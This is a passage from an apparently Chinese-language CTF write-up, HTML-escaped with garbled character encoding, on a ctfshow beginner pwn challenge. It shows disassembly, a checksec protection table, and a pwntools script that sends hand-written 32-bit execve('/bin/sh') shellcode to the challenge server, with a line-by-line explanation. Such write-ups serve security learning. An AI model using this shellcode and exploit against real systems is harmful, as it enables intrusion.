&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FD&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_puts&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048503&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048506&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;nop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048512&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;retn&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; } // starts at 80484C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;endp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™ä»£ç æ˜¯åœ¨çœ‹ä¸æ‡‚å¯ä»¥ä¸ŠAIå—¦ä¸€ä¸‹ï¼Œè®©å®ƒå¸®ä½ è§£æä¸€ä¸‹ï¼Œæ¯•ç«Ÿåˆšå…¥é—¨&amp;hellip;&amp;hellip;ï¼ˆè¿™æ®µä»£ç æ˜¯ IDA åç¼–è¯‘å‡ºçš„ 32 ä½ x86 æ¶æ„ç¨‹åºä¸­&lt;code&gt;ctfshow&lt;/code&gt;å‡½æ•°ï¼‰&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼šè®°ä½ä¸Šé¢çš„å‚æ•°ï¼Œåé¢å†™expè¦ç”¨&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/62.png&#34;
	width=&#34;675&#34;
	height=&#34;180&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/62_hu_384015e3cc48e.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/62_hu_8910832fcad885ea.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;375&#34;
		data-flex-basis=&#34;900px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯çŸ¥ï¼Œå¯¹è¿™äº›ä¿æŠ¤æœ‰ç‚¹é—å¿˜çš„å¯ä»¥å›å»çœ‹&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#linux%e5%ae%89%e5%85%a8%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1çš„Linuxå®‰å…¨ä¿æŠ¤æœºåˆ¶&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;ä¿æŠ¤é¡¹&lt;/th&gt;
          &lt;th&gt;çŠ¶æ€&lt;/th&gt;
          &lt;th&gt;å¯¹åˆ©ç”¨çš„å½±å“&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Arch&lt;/td&gt;
          &lt;td&gt;i386-32-Little&lt;/td&gt;
          &lt;td&gt;32 ä½ x86 æ¶æ„ï¼Œshellcode éœ€ç”¨ 32 ä½ç‰ˆæœ¬ï¼ˆå¯¹åº”&lt;code&gt;shellcraft.i386.sh()&lt;/code&gt;ï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Canaryï¼ˆæ ˆæº¢å‡ºä¿æŠ¤ï¼‰&lt;/td&gt;
          &lt;td&gt;No canary found&lt;/td&gt;
          &lt;td&gt;æ— æ ˆæº¢å‡ºä¿æŠ¤ï¼Œç¼“å†²åŒºæº¢å‡ºåå¯ç›´æ¥è¦†ç›–æ ˆä¸Šæ•°æ®ï¼ˆæ— éœ€ç»•è¿‡ canaryï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;NXï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰&lt;/td&gt;
          &lt;td&gt;NX disabled&lt;/td&gt;
          &lt;td&gt;æ ˆæ®µå¯æ‰§è¡Œï¼Œshellcode ç›´æ¥æ”¾åœ¨æ ˆä¸Šå°±èƒ½è¿è¡Œï¼ˆæ— éœ€ ROP ç»•è¿‡ NXï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;PIEï¼ˆåœ°å€éšæœºåŒ–ï¼‰&lt;/td&gt;
          &lt;td&gt;No PIE (0x8048000)&lt;/td&gt;
          &lt;td&gt;ç¨‹åºåœ°å€å›ºå®šï¼Œ&lt;code&gt;ctfshow&lt;/code&gt;å‡½æ•°ã€&lt;code&gt;buf&lt;/code&gt;ç¼“å†²åŒºåœ°å€ä¸ä¼šå˜ï¼ˆæ— éœ€æ³„éœ²åœ°å€ï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RWX segments&lt;/td&gt;
          &lt;td&gt;Has RWX segments&lt;/td&gt;
          &lt;td&gt;å­˜åœ¨ â€œå¯è¯»å¯å†™å¯æ‰§è¡Œâ€ çš„å†…å­˜æ®µï¼Œè¿›ä¸€æ­¥ç¡®ä¿ shellcode èƒ½æ­£å¸¸æ‰§è¡Œ&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;æ€»ç»“&lt;/strong&gt;ï¼šç¨‹åºä¿æŠ¤æœºåˆ¶æå¼±ï¼Œç›´æ¥ç”¨ â€œæ ˆæº¢å‡ºæ³¨å…¥ shellcodeâ€ å³å¯ï¼Œæ— éœ€å¤æ‚ç»•è¿‡ã€‚&lt;/p&gt;
&lt;p&gt;å›åˆ°æœ¬é¢˜ç›®ï¼Œåœ¨ncè¿æ¥ä¹‹åäº¤äº’ä¸€ä¼šå‘ç°å¹¶æ— å®é™…æ•ˆæœï¼ŒPWNå¤§è‡´æ€è·¯æ˜¯æ‰¾åˆ°åé—¨å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å‡½æ•°è¿›è¡Œ&lt;code&gt;ææƒ&lt;/code&gt;ï¼Œææƒä¹‹åå°±è¿›è¡Œäº¤äº’å»æ‰§è¡Œä¸€äº›é¶æœºçš„ç»ˆç«¯å‘½ä»¤ä¾‹å¦‚ï¼šcat ctfshow_flagã€lsä¹‹ç±»çš„ã€‚é‚£åœ¨æ­¤ä¹‹å‰éƒ½å¾—å…ˆæ‰¾åˆ°è¿™â€œåé—¨â€ï¼Œä¹Ÿå°±æ˜¯/bin/shã€zshã€systemå‡½æ•°ç­‰ç­‰ï¼Œä½†æˆ‘å‘ç°è¿™ä¸ªç¨‹åºå¹¶æ— è¿™äº›åœ°å€å­˜åœ¨ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªç¨‹åºä»è¢«åˆ¶é€ å‡ºæ¥éƒ½æ²¡æƒ³è¿‡è¦æ‰§è¡Œè¿™äº›æœ‰å…³ææƒçš„ä»£ç &amp;hellip;..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/66.png&#34;
	width=&#34;1650&#34;
	height=&#34;625&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/66_hu_da2faac4b22ea10b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/66_hu_a3ee0bccff8fa056.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;å…¨ç¯‡æœç´¢/bin/shå­—ç¬¦ä¸²&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;264&#34;
		data-flex-basis=&#34;633px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å› ä¸ºNXã€canaryæ²¡å¼€ã€åˆæœ‰RWXï¼Œæ³¨å…¥ä¸€æ®µæˆ‘ä»¬è®¾è®¡çš„æœ‰å…³æ‰§è¡Œ/bin/shçš„expè¿˜æ˜¯å¯ä»¥çš„ï¼Œå¤§è‡´æ€è·¯æœ‰äº†ï¼Œæ¥ä¸‹æ¥å¼€å§‹æ‰§è¡Œå§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å›´ç»• â€œç›´æ¥æ‰§è¡Œ shellcodeâ€ è®¾è®¡æ–¹æ¡ˆ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥ç”¨pwntoolsçš„è„šæœ¬å•Šï¼Œå•çº¯ç›´æ¥è°ƒç”¨å‡½æ•°çš„ï¼Œè€Œä¸”pwntoolsæœ‰å±€é™å•Šï¼Œå°±é‚£ç”¨è¿™ä¸ªpwntoolsçš„shellcraftæ¨¡å—ç”Ÿæˆçš„shellcodeæ¯”è¾ƒæ™¦æ¶©éš¾æ‡‚ï¼Œè€Œä¸”æ³¨é‡Šæ”¾åˆ°Kaliä¸Šæ¯”è¾ƒæ‚ä¹±ï¼Œè€Œä¸”æ²¡æœ‰æ¶‰åŠåˆ°æ±‡ç¼–è¯­è¨€è°ƒç”¨ï¼Œæ¯”è¾ƒç®€å•æˆ‘å°±ä¸ç”¨äº†ï¼Œæˆ‘è¿™é‡Œæ‰‹æ•²shellcodeæ–¹ä¾¿å¤§å®¶äº†è§£ä¸€ä¸‹åº•å±‚é€»è¾‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# å¯¼å…¥ pwntools åº“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºè°ƒè¯•æ¨¡å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;) # æœ¬åœ°è¿æ¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28176&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# è¿œç¨‹è¿æ¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov eax, 0xb      
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov ecx, 0       
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov edx, 0       
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;push 0x0068732f  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;push 0x6e69622f   
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov ebx, esp    
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;int 0x80         
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# ç”Ÿæˆä¸€ä¸ª Shellcode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# å°†ç”Ÿæˆçš„ Shellcode å‘é€åˆ°ç›®æ ‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åˆ›å»ºä¸€ä¸ªpythonæ–‡ä»¶ï¼Œè¾“å…¥è¿™äº›ä»£ç æ”¾åˆ°ç»ˆç«¯ä¸Šè¿è¡Œï¼Œè®°å¾—æå‰æ‰“å¼€å¦å¤–ä¸€ä¸ªçª—å£è¿›è¡Œncè¿æ¥è¿œç¨‹é¶æœºã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šé¢å…¶å®ƒçš„pythonä»£ç æ²¡å•¥å¯è®²çš„ï¼Œè¿™æ˜¯è¿œç¨‹äº¤äº’çš„æ¨¡æ¿ä»£ç ï¼Œç›´æ¥å¥—å°±å¥½ï¼Œæˆ‘ç°åœ¨é‡åœ¨è®²è§£è¿™ä¸ªæ‰‹æ“çš„shellcodeï¼Œå®ƒå’Œshellcraftæ¨¡å—äº§ç”Ÿçš„shellcodeæ•ˆæœä¸€æ ·çš„ï¼Œè€Œä¸”è¿˜å¥½çœ‹æ‡‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; syscallå·ï¼š11å¯¹åº”execve&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; argvå‚æ•°ä¸ºNULL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; envpå‚æ•°ä¸ºNULL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0068732f&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; å‹æ ˆå­—ç¬¦ä¸²&amp;#34;/sh\0&amp;#34;ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6e69622f&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; å‹æ ˆå­—ç¬¦ä¸²&amp;#34;/bin&amp;#34;ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; ebxæŒ‡å‘æ ˆé¡¶çš„&amp;#34;/bin/sh&amp;#34;å­—ç¬¦ä¸²åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; è§¦å‘ç³»ç»Ÿè°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;è¿™ 7 è¡Œä»£ç é€šè¿‡ç²¾å‡†è®¾ç½®å¯„å­˜å™¨å’Œæ ˆæ•°æ®ï¼Œå®Œæˆäº†&lt;code&gt;execve&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°å‡†å¤‡ï¼Œæœ€ç»ˆå®ç° â€œç”¨&lt;code&gt;/bin/sh&lt;/code&gt;æ›¿æ¢å½“å‰è¿›ç¨‹â€ çš„æ•ˆæœï¼Œæ˜¯ CTF ä¸­è·å– shell çš„åŸºç¡€æ‰‹æ®µï¼Œé€»è¾‘æ¸…æ™°ä¸”ç²¾ç®€ï¼ˆä»… 23 å­—èŠ‚ï¼‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;é€è¡Œè§£ææ‰‹æ•²shellcode&#34;&gt;é€è¡Œè§£ææ‰‹æ•²shellcode
&lt;/h4&gt;&lt;p&gt;æ€è·¯ï¼šæ³¨å…¥ä¸€æ®µèƒ½æ‰§è¡Œ/bin/shçš„æ±‡ç¼–è¯­è¨€ä»£ç &lt;/p&gt;
